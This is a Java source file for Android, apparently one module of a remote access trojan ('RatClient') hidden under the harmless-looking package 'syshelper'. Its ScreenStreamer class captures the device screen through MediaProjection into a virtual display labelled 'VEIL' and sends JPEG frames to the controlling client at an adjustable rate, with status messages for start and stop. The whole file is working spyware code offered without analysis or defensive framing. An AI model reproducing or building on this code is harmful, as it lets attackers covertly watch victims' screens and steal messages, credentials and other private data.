package com.syshelper.service;
import android.content.Context;
import android.content.Intent;
import android.graphics.Bitmap;
import android.graphics.PixelFormat;
import android.hardware.display.DisplayManager;
import android.hardware.display.VirtualDisplay;
import android.media.Image;
import android.media.ImageReader;
import android.media.projection.MediaProjection;
import android.media.projection.MediaProjectionManager;
import android.os.Handler;
import android.os.HandlerThread;
import android.view.Display;
import android.view.WindowManager;
import java.io.ByteArrayOutputStream;
import java.nio.ByteBuffer;

public class ScreenStreamer {
    private final Context ctx;
    private final RatClient client;
    private MediaProjection mediaProjection;
    private VirtualDisplay virtualDisplay;
    private ImageReader imageReader;
    private HandlerThread captureThread;
    private Handler captureHandler;
    private volatile boolean streaming = false;
    private int fps = 2;
    private int quality = 50;
    private int width = 720;
    private int height = 1280;

    public ScreenStreamer(Context ctx, RatClient client) { this.ctx = ctx; this.client = client; }

    public void start(int resultCode, Intent data, int fps, int quality) {
        if (streaming) return;
        this.fps = Math.max(1, Math.min(fps, 10));
        this.quality = Math.max(10, Math.min(quality, 100));
        captureThread = new HandlerThread("ScreenCapture"); captureThread.start();
        captureHandler = new Handler(captureThread.getLooper());
        MediaProjectionManager mpm = (MediaProjectionManager) ctx.getSystemService(Context.MEDIA_PROJECTION_SERVICE);
        mediaProjection = mpm.getMediaProjection(resultCode, data);
        if (mediaProjection == null) { client.sendResult("screen_stream", "MediaProjection failed"); return; }
        Display display = ((WindowManager) ctx.getSystemService(Context.WINDOW_SERVICE)).getDefaultDisplay();
        android.graphics.Point size = new android.graphics.Point(); display.getRealSize(size);
        width = size.x; height = size.y;
        imageReader = ImageReader.newInstance(width, height, PixelFormat.RGBA_8888, 2);
        virtualDisplay = mediaProjection.createVirtualDisplay("VEIL", width, height, ctx.getResources().getDisplayMetrics().densityDpi, DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR, imageReader.getSurface(), null, captureHandler);
        streaming = true; client.sendResult("screen_stream", "started");
        captureHandler.post(new Runnable() {
            @Override
            public void run() {
                if (!streaming) return;
                captureAndSend();
                captureHandler.postDelayed(this, 1000 / ScreenStreamer.this.fps);
            }
        });
    }

    private void captureAndSend() {
        Image image = null;
        try {
            image = imageReader.acquireLatestImage();
            if (image == null) return;
            Image.Plane[] planes = image.getPlanes();
            ByteBuffer buffer = planes[0].getBuffer();
            int pixelStride = planes[0].getPixelStride();
            int rowStride = planes[0].getRowStride();
            int rowPadding = rowStride - pixelStride * width;
            Bitmap bitmap = Bitmap.createBitmap(width + rowPadding / pixelStride, height, Bitmap.Config.ARGB_8888);
            bitmap.copyPixelsFromBuffer(buffer);
            Bitmap cropped = Bitmap.createBitmap(bitmap, 0, 0, width, height);
            bitmap.recycle();
            ByteArrayOutputStream bos = new ByteArrayOutputStream();
            cropped.compress(Bitmap.CompressFormat.JPEG, quality, bos); cropped.recycle();
            client.sendFile("screen.jpg", bos.toByteArray(), "screen_stream");
        } catch (Exception ignored) {
        } finally { if (image != null) image.close(); }
    }

    public void stop() {
        streaming = false;
        if (virtualDisplay != null) virtualDisplay.release();
        if (imageReader != null) imageReader.close();
        if (mediaProjection != null) mediaProjection.stop();
        if (captureThread != null) captureThread.quitSafely();
        client.sendResult("screen_stream", "stopped");
    }
}
